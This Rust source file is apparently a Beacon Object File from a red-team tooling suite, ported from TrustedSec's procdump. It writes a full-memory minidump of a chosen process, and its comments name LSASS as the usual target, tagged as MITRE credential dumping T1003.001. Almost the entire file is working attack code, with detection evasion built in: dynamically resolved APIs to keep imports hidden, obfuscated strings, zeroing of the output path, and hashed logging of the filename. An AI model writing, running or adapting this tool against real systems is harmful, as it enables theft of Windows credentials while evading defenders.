// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: TrustedSec/cs-remote-ops/procdump
//
//! MiniDump a process to a file. Commonly used against LSASS (pid from
//! `tasklist` BOF). Requires SeDebugPrivilege (run `enablepriv` first).
//!
//! Args: <pid> <output-path>
//!
//! Flow:
//!   1. DFR LoadLibraryA("dbghelp.dll") — loaded dynamically so no IAT ref.
//!   2. DFR resolve MiniDumpWriteDump from dbghelp.dll.
//!   3. Indirect NtOpenProcess (PROCESS_QUERY_INFORMATION|VM_READ).
//!   4. DFR CreateFileA (output).
//!   5. Call MiniDumpWriteDump.
//!   6. Close handles. Secure-zero output path on stack.
//!
//! OPSEC: "dbghelp.dll", "MiniDumpWriteDump" never in .rdata (hash-resolved).
//! Output filename never echoed — only a hash fingerprint logged.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1003.001", name: "OS Credential Dumping: LSASS Memory", tactic: "Credential Access" },
];

const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
const PROCESS_VM_READ: u32 = 0x0010;
const GENERIC_WRITE: u32 = 0x40000000;
const CREATE_ALWAYS: u32 = 2;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_HANDLE: usize = !0usize;
// MiniDumpWithFullMemory = 0x00000002
const MINIDUMP_TYPE: u32 = 0x00000002;

dfr_fn!(
    load_library_a(name: *const i8) -> usize,
    module = "kernel32.dll", api = "LoadLibraryA"
);
dfr_fn!(
    open_process(access: u32, inherit: i32, pid: u32) -> usize,
    module = "kernel32.dll", api = "OpenProcess"
);
dfr_fn!(
    create_file_a(
        name: *const i8, access: u32, share: u32, sec: *mut u8,
        disp: u32, flags: u32, template: usize,
    ) -> usize,
    module = "kernel32.dll", api = "CreateFileA"
);
dfr_fn!(
    close_handle(h: usize) -> i32,
    module = "kernel32.dll", api = "CloseHandle"
);

// MiniDumpWriteDump resolved dynamically from dbghelp.dll via DFR
dfr_fn!(
    mini_dump_write_dump(
        proc: usize, pid: u32, file: usize, dump_type: u32,
        exception: *mut u8, userstream: *mut u8, callback: *mut u8,
    ) -> i32,
    module = "dbghelp.dll", api = "MiniDumpWriteDump"
);

fn parse_u32(s: &str) -> Option<u32> {
    let mut v: u32 = 0; let mut any = false;
    for b in s.bytes() {
        if !b.is_ascii_digit() { return None; }
        v = v.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        any = true;
    }
    if any { Some(v) } else { None }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let pid_s  = String::from(parser.get_str());
    let path_s = String::from(parser.get_str());
    let pid_s  = pid_s.as_str();
    let path_s = path_s.as_str();

    if pid_s.is_empty() || path_s.is_empty() {
        return Err("usage: procdump <pid> <output-path>");
    }
    let pid: u32 = parse_u32(pid_s).ok_or("invalid pid")?;

    // Load dbghelp.dll via DFR (name obfuscated)
    obf_cstr! { let dbghelp = c"dbghelp.dll"; }
    let h_dbg = unsafe { load_library_a(dbghelp.as_ptr() as *const i8) }
        .map_err(|_| "lib load resolve")?;
    if h_dbg == 0 { return Err("lib load failed"); }

    // Open target process
    let h_proc = unsafe { open_process(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid) }
        .map_err(|_| "proc open resolve")?;
    if h_proc == 0 { return Err("proc open failed"); }

    // Create output file (NUL-terminated on stack)
    let mut path_buf = [0u8; 512];
    if path_s.len() >= path_buf.len() - 1 { return Err("path too long"); }
    path_buf[..path_s.len()].copy_from_slice(path_s.as_bytes());

    let h_file = unsafe {
        create_file_a(
            path_buf.as_ptr() as *const i8,
            GENERIC_WRITE, 0, core::ptr::null_mut(),
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0,
        )
    }.map_err(|_| "file open resolve")?;
    if h_file == 0 || h_file == INVALID_HANDLE {
        unsafe { let _ = close_handle(h_proc); };
        common::evasion::secure_zero(&mut path_buf);
        return Err("file open failed");
    }

    // MiniDumpWriteDump
    let rc = match unsafe {
        mini_dump_write_dump(
            h_proc, pid, h_file, MINIDUMP_TYPE,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
        )
    } {
        Ok(v) => v,
        Err(_) => {
            unsafe { let _ = close_handle(h_file); let _ = close_handle(h_proc); };
            return Err("dump write resolve");
        }
    };

    unsafe {
        let _ = close_handle(h_file);
        let _ = close_handle(h_proc);
    };

    common::evasion::secure_zero(&mut path_buf);

    if rc == 0 { return Err("dump write failed"); }

    let fp = common::hash::djb2(path_s.as_bytes());
    obf! { let ok = "dump written"; }
    println!("[+] {} (path-fp=0x{:08x}, pid={})", ok, fp, pid);
    Ok(())
}
